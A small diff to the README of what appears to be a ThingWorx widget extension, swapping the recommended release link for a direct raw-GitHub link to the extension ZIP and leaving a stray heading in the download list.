@@ -5,7 +5,10 @@ Since the `window` object is blocked in Mashup Expressions, this widget provides
 
 ## Download
 
-- **Latest release (recommended):** [Download ZIP](../../releases/latest)
+- **Latest release (recommended):** ## Download
+
+[Download Extension ZIP](https://github.com/Jamal8548/twx-window-object-ext/raw/main/twx-window-object-ext.zip)
+
 - Or direct file: [`twx-window-object-ext-1.0.0.zip`](./twx-window-object-ext-1.0.0.zip)  
   *(If no file appears here, grab it from the Releases page.)*
 
